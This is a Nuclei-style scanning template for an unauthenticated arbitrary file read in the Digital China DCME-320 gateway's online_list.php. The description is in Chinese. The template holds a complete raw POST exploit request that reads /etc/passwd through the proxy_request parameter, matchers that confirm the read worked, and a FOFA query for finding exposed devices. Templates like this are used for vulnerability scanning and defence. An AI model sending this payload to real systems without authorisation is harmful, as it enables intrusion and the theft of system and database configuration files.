http:
    - matchers:
        - condition: and
          part: body
          type: word
          words:
            - root:x
            - root:/bin
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          POST /function/auth/user/online_list.php HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
          Accept-Encoding: gzip, deflate
          Accept-Language: zh-CN,zh;q=0.9
          Content-Type: application/x-www-form-urlencoded
          Connection: close

          proxy_request=/etc/passwd
id: digitalchina-DCME-online_list_php-File-reading
info:
    author: Superhero
    description: |-
        fofa: body="style/blue/css/dcn_ui.css"
        神州数码 DCME-320出口网关 online_list.php 任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
    name: 神州数码 DCME-320出口网关 online_list.php 任意文件读取漏洞
    reference:
        - https://mp.weixin.qq.com/s/_VqVU3mjxwi7CL5uP0ag1g?token=1383368913&lang=zh_CN
    severity: high
    tags:
        - File reading
